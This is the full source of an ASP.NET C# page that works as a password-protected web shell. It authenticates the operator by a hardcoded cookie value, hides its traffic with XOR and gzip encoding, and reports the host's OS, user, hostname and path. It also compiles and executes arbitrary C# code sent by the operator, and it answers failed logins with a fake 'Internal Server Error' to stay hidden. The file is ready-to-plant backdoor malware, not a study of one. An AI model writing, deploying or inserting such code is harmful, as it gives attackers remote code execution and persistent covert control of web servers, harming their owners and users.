<%@ Page Language="C#" %>
<%@ import Namespace="System.IO" %>
<%@ import Namespace="System.Net" %>
<%@ import Namespace="System.Text" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="Microsoft.CSharp" %>
<%@ import Namespace="System.IO.Compression" %>
<%@ import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.CodeDom.Compiler" %>
<%@ Import Namespace="System.Security.Principal" %>


<script type="test" language="C#" runat="Server"> 

    public class Handler
    {
        public const string REQUEST_METHOD                  = "POST";
        public const string PASSWORD_TYPE                   = "COOKIE";
        public const string PASSWORD_KEY                    = "X-Authorization";
        public const string PASSWORD_VALUE                  = "P4ssw0rd!";
        public const string REQUEST_DATA_TYPE               = "FIELD";
        public const string REQUEST_DATA_KEY                = "data";
        public const string RESPONSE_DATA_KEY               = "data";
    
        public const string SUCC_CODE                       = "0";
        public const string ERR_CODE                        = "1";
        public const string FIELD_SEPARATOR                 = ",";
        public const string VALUE_SEPARATOR                 = "=";
        public const string CUSTOM_SEPARATOR                = "|";
    
        public const string REQ_ACTION_KEY                  = "action";
        public const string REQ_MSG_KEY                     = "data";

        public const string REQ_MOD_NAME_KEY                = "name";
        public const string REQ_MOD_CONTENT_KEY             = "content";
        public const string REQ_MOD_ARGS_KEY                = "args";
        public const string REQ_MOD_CWD_KEY                 = "cwd";
        public const string REQ_MOD_TOKEN_KEY               = "token";
        public const string REQ_MOD_REFS_KEY                = "references";

        public const string RES_STATUS_KEY                  = "status";
        public const string RES_MESSAGE_KEY                 = "message";
        
        public const string ACTION_STATUS                   = "0";
        public const string ACTION_INVOKE                   = "1";
    
        public const string MODULE_INVOKE_METHOD            = "go";
        public const string MODULE_RESP_STATUS              = "status";
        public const string MODULE_RESP_MESSAGE             = "message";
    
        public const string ERR_INVALID_REQ_TYPE            = "invalid request type";
        public const string ERR_NONEXISTENT_COOKIE          = "non-existent cookie in request";
        public const string ERR_EXCEPTION_IN_HANDLE         = "exception capture in handle";
        public const string ERR_NONEXISTENT_DATA            = "non-existent data";
        public const string ERR_NONEXISTENT_ACTION          = "non-existent action";
        public const string ERR_UNKNOWN_ACTION              = "unknown action code";
        public const string ERR_EXCEPTION_FROM_MODULE       = "module throw an exception";
        public const string ERR_NONEXISTENT_ACTION_DATA     = "non-existent action data";
        public const string ERR_NONEXISTENT_MOD_NAME        = "non-existent module name";
        public const string ERR_NONEXISTENT_MOD_CONTENT     = "non-existent module content";
        public const string ERR_NONEXISTENT_MOD_ARGS        = "non-existent module args";
        public const string ERR_NONEXISTENT_MOD_CWD         = "non-existent module cwd";
        public const string ERR_NONEXISTENT_MOD_TOKEN       = "non-existent module token";
        public const string ERR_NONEXISTENT_MOD_REFS        = "non-existent module refs";
        public const string ERR_INVALID_MOD_RESPONSE        = "invalid module response";

        private HttpRequest Request;
        private HttpResponse Response;
        private HttpContext Context;
    
        public Handler(HttpRequest Request, HttpResponse Response, HttpContext Context)
        {
            this.Request = Request;
            this.Response = Response;
            this.Context = Context;
        }

        private string get_field(string type, string name)
        {
            switch (type)
            {
                case "HEADER":
                    return this.Request.Headers[name];
                case "COOKIE":
                    if (this.Request.Cookies[name] == null)
                        throw new Exception(ERR_NONEXISTENT_COOKIE);
                    return this.Request.Cookies[name].Value;
                case "FIELD":
                    return this.Request.Params[name];
                default:
                    throw new Exception(ERR_INVALID_REQ_TYPE);
            }
        }

        private byte[] crypt(byte[] data)
        {
            for (int i = 0; i < data.Length; i++)
                data[i] = Convert.ToByte((uint)data[i] ^ (uint)PASSWORD_VALUE[i % PASSWORD_VALUE.Length]);
            return data;
        }

        private byte[] hex2bin(string data)
        {
            if ((data.Length % 2) == 1)
                throw new Exception("hex2bin(): data cannot have an odd number of digits: '" + data + "'");

            byte[] data_bytes = new byte[data.Length / 2];
            for (int i = 0; i < data.Length; i += 2)
            {
                string hs = data.Substring(i, 2);
                try
                {
                    data_bytes[i/2] = Convert.ToByte(hs, 16);
                }
                catch(Exception)
                {
                    throw new Exception("hex2bin() failed to convert hex:'" + hs + "' to byte");
                }
            }
            return data_bytes;
        }

        private string bin2hex(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

        private string protect(string data)
        {
            byte[] data_raw_bytes   = Encoding.UTF8.GetBytes(data);
            byte[] compressed       = compress(data_raw_bytes);
            byte[] data_crypt_bytes = crypt(compressed);
            string data_crypt_hex   = bin2hex(data_crypt_bytes);
            return data_crypt_hex;
        }

        private string unprotect(string data)
        {
            byte[] data_crypt       = hex2bin(data);
            byte[] data_dec_hex     = crypt(data_crypt);
            byte[] uncompressed     = uncompress(data_dec_hex);
            return Encoding.UTF8.GetString(uncompressed, 0, uncompressed.Length);
        }
        
        private byte[] compress(byte[] data)
        {
            using (MemoryStream mso = new MemoryStream())
            {
                using (GZipStream gs = new GZipStream(mso, CompressionMode.Compress))
                {
                    gs.Write(data, 0, data.Length);
                }
        
                return mso.ToArray();
            }
        }
        
        private byte[] uncompress(byte[] data)
        {
            using (GZipStream gs = new GZipStream(new MemoryStream(data), CompressionMode.Decompress))
            {
                const int size = 4096;
                byte[] buffer = new byte[size];
                using (MemoryStream mso = new MemoryStream())
                {
                    int count = 0;
                    do
                    {
                        count = gs.Read(buffer, 0, size);
                        if (count > 0)
                        {
                            mso.Write(buffer, 0, count);
                        }
                    }
                    while (count > 0);
                    return mso.ToArray();
                }
            }
        }

        private string generate_response(string status, string message)
        {
            string response = "";
            response += RES_STATUS_KEY + VALUE_SEPARATOR + status + FIELD_SEPARATOR;
            byte[] message_raw_bytes = Encoding.UTF8.GetBytes(message);
            string message_enc_str = bin2hex(message_raw_bytes);
            response += RES_MESSAGE_KEY + VALUE_SEPARATOR + message_enc_str;
            return pack_value(RESPONSE_DATA_KEY, protect(response), true);
        }

        private Dictionary<string, string> unpack_data(string data)
        {
            string[] fields = data.Split(new string[] {FIELD_SEPARATOR}, StringSplitOptions.None);
            if (fields.Length < 1)
                throw new Exception("unpack_data(): Split() fields < 1: '" + string.Join(" ", fields) + "'");
            
            Dictionary<string, string> dict = new Dictionary<string, string>();
            foreach (string field in fields)
            {
                string[] vals = field.Split(new string[] {VALUE_SEPARATOR}, StringSplitOptions.None);
                if (vals.Length != 2)
                    throw new Exception("unpack_data(): Split() values != 2 '" + string.Join(" ", vals) + "'");
                
                dict.Add(vals[0], vals[1]);
            }
            return dict;
        }

        private string pack_value(string key, string val, bool end)
        {
            if (end)
            {
                return key + VALUE_SEPARATOR + val;
            }
            else
            {
                byte[] val_bytes   = Encoding.UTF8.GetBytes(val);
                return key + VALUE_SEPARATOR + bin2hex(val_bytes);
            }
        }

        private string get_so()
        {
            OperatingSystem os = Environment.OSVersion;
            PlatformID     pid = os.Platform;
            switch (pid)
            {
                case PlatformID.Win32NT:
                case PlatformID.Win32S:
                case PlatformID.Win32Windows:
                case PlatformID.WinCE:
                    return "Windows";
                case PlatformID.Unix:
                    return "Linux";
                default:
                    return "Unknown";
            }
        }

        private string get_user()
        {
            string username = "";
            using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
            {
                username = wid.Name;
            }
            return username;
        }

        private string get_hostName()
        {
            try
            {
                return Dns.GetHostName();
            }
            catch(Exception)
            {
                return "";
            }
        }

        public bool authenticate()
        {
            try
            {
                string request_password = get_field(PASSWORD_TYPE, PASSWORD_KEY);
                if (request_password == null)
                        return false;
                if (request_password != PASSWORD_VALUE)
                        return false;
                return true;
            }
            catch(Exception ex)
            {
                return false;
            }
        }

        private string do_status()
        {
            string response = "";
            response += pack_value("so", get_so(), false);
            response += FIELD_SEPARATOR;
            response += pack_value("pwd", Path.GetDirectoryName(this.Request.PhysicalPath).Replace(@"\", @"/"), false);
            response += FIELD_SEPARATOR;
            response += pack_value("type", "cs", false);
            response += FIELD_SEPARATOR;
            response += pack_value("version", Environment.Version.ToString(), false);
            response += FIELD_SEPARATOR;
            response += pack_value("user", get_user(), false);
            response += FIELD_SEPARATOR;
            response += pack_value("hostname", get_hostName(), false);
            return generate_response(SUCC_CODE, response);
        }

        private void load_references(CompilerParameters compilerParams, string refs)
        {
            string[] module_references = refs.Split(',');

            foreach (string module_reference in module_references)
            {
                if (Path.IsPathRooted(module_reference) == false)
                {
                    compilerParams.ReferencedAssemblies.Add(module_reference);
                    continue;
                }

                if (File.Exists(module_reference) == false)
                {
                    throw new Exception("Reference '" + module_reference + "' not exists");
                }

                compilerParams.ReferencedAssemblies.Add(module_reference);                
            }
        } 

        private string do_invoke(Dictionary<string, string> unpacked_request)
        {
            if (!unpacked_request.ContainsKey(REQ_MSG_KEY))
                return generate_response(ERR_CODE, ERR_NONEXISTENT_ACTION_DATA);
            
            byte[] action_data_bytes  = hex2bin(unpacked_request[REQ_MSG_KEY]);
            string action_data_str = Encoding.UTF8.GetString(action_data_bytes, 0, action_data_bytes.Length);
            
            Dictionary<string, string> action_data_unpack = unpack_data(action_data_str);
            if (!action_data_unpack.ContainsKey(REQ_MOD_NAME_KEY))
                return generate_response(ERR_CODE, ERR_NONEXISTENT_MOD_NAME);
            if (!action_data_unpack.ContainsKey(REQ_MOD_CONTENT_KEY))
                return generate_response(ERR_CODE, ERR_NONEXISTENT_MOD_CONTENT);
            if (!action_data_unpack.ContainsKey(REQ_MOD_ARGS_KEY))
                return generate_response(ERR_CODE, ERR_NONEXISTENT_MOD_ARGS);
            if (!action_data_unpack.ContainsKey(REQ_MOD_CWD_KEY))
                return generate_response(ERR_CODE, ERR_NONEXISTENT_MOD_CWD);
            if (!action_data_unpack.ContainsKey(REQ_MOD_TOKEN_KEY))
                return generate_response(ERR_CODE, ERR_NONEXISTENT_MOD_TOKEN);
            if (!action_data_unpack.ContainsKey(REQ_MOD_REFS_KEY))
                return generate_response(ERR_CODE, ERR_NONEXISTENT_MOD_REFS);

            byte[] mod_name_bytes    = hex2bin(action_data_unpack[REQ_MOD_NAME_KEY]);
            string mod_name          = Encoding.UTF8.GetString(mod_name_bytes, 0, mod_name_bytes.Length);
            byte[] mod_content_bytes = hex2bin(action_data_unpack[REQ_MOD_CONTENT_KEY]);
            string mod_content       = Encoding.UTF8.GetString(mod_content_bytes, 0, mod_content_bytes.Length);
            string mod_raw_args      = action_data_unpack[REQ_MOD_ARGS_KEY];
            byte[] mod_cwd_bytes     = hex2bin(action_data_unpack[REQ_MOD_CWD_KEY]);
            string mod_cwd           = Encoding.UTF8.GetString(mod_cwd_bytes, 0, mod_cwd_bytes.Length);
            byte[] mod_token_bytes   = hex2bin(action_data_unpack[REQ_MOD_TOKEN_KEY]);
            string mod_token         = Encoding.UTF8.GetString(mod_token_bytes, 0, mod_token_bytes.Length);
            byte[] mod_refs_bytes    = hex2bin(action_data_unpack[REQ_MOD_REFS_KEY]);
            string mod_refs          = Encoding.UTF8.GetString(mod_refs_bytes, 0, mod_refs_bytes.Length);

            CompilerResults results = null;
            
            try
            {
                CSharpCodeProvider provider = new CSharpCodeProvider();
                CompilerParameters compilerParams = new CompilerParameters();
                compilerParams.GenerateInMemory = true;
                compilerParams.GenerateExecutable = false;
                compilerParams.ReferencedAssemblies.Add("System.dll");

                load_references(compilerParams, mod_refs);

                results = provider.CompileAssemblyFromSource(compilerParams, mod_content);

                Assembly mod_assembly = results.CompiledAssembly;
                Type mod_assembly_type = mod_assembly.GetType(mod_name);
                if (mod_assembly_type == null)
                    return generate_response(ERR_CODE, "Type: '" + mod_name + "' not found in Assembly Module");

                MethodInfo mod_assembly_method = mod_assembly_type.GetMethod(MODULE_INVOKE_METHOD);
                if (mod_assembly_method == null)
                    return generate_response(ERR_CODE, "Method: '" + MODULE_INVOKE_METHOD + "' not found in Assembly Module: '" + mod_name + "'");

                object mod_assembly_instance = mod_assembly.CreateInstance(mod_name);
                object mod_assembly_result = mod_assembly_method.Invoke(mod_assembly_instance, new object[] { mod_cwd, mod_raw_args, mod_token });
                
                List<Object> mod_assembly_results = new List<Object>((IEnumerable<Object>)mod_assembly_result);

                if (mod_assembly_results.Count != 2)
                    return generate_response(ERR_CODE, ERR_INVALID_MOD_RESPONSE);

                string status_code = mod_assembly_results[0].ToString();
                string message     = mod_assembly_results[1].ToString();
    
                return generate_response(status_code, message);
            }
            catch(Exception ex)
            {
                string ex_message = "Exception: " + ERR_EXCEPTION_FROM_MODULE + Environment.NewLine + ex.ToString();
                for (int i=0; i < results.Errors.Count; i++)                
                    ex_message +=  i.ToString() + ": " + results.Errors[i].ToString() + Environment.NewLine;
                return generate_response(ERR_CODE, ex_message);
            }
        }
        
        public string handle()
        {
            try
            {
                string raw_request_data = get_field(REQUEST_DATA_TYPE, REQUEST_DATA_KEY);
                if (raw_request_data ==  null)
                    return generate_response(ERR_CODE, ERR_NONEXISTENT_DATA);
                
                string request_data = unprotect(raw_request_data);
                Dictionary<string, string> unpacked_request = unpack_data(request_data);
        
                if (!unpacked_request.ContainsKey(REQ_ACTION_KEY))
                    return generate_response(ERR_CODE, ERR_NONEXISTENT_ACTION);

                switch (unpacked_request[REQ_ACTION_KEY])
                {
                    case ACTION_STATUS:
                        return do_status();
                    case ACTION_INVOKE:
                        return do_invoke(unpacked_request);
                    default:
                        return generate_response(ERR_CODE, ERR_UNKNOWN_ACTION);
                }
            }
            catch(Exception ex)
            {
                return generate_response(ERR_CODE, ERR_EXCEPTION_IN_HANDLE + Environment.NewLine + ex.ToString());
            }
        }
    }
    
    void Page_Load(object sender, EventArgs e) 
    {
        string response_data = "";
        
        Handler handler = new Handler(Request, Response, HttpContext.Current);
        
        if (Request.HttpMethod == Handler.REQUEST_METHOD)
        {
            if (handler.authenticate())
            {
                Response.StatusCode = 200;
                response_data = handler.handle();
            }
            else
            {
                Response.StatusCode = 500;
                response_data = "Internal Server Error";
            }
        }
        else
        {
            Response.StatusCode = 400;
            response_data = "Bad Request";
        }
        
        Response.Clear();
        Response.ContentType = "text/html; charset=utf-8";
        Response.Write(response_data);
        Response.End();
    }
</script>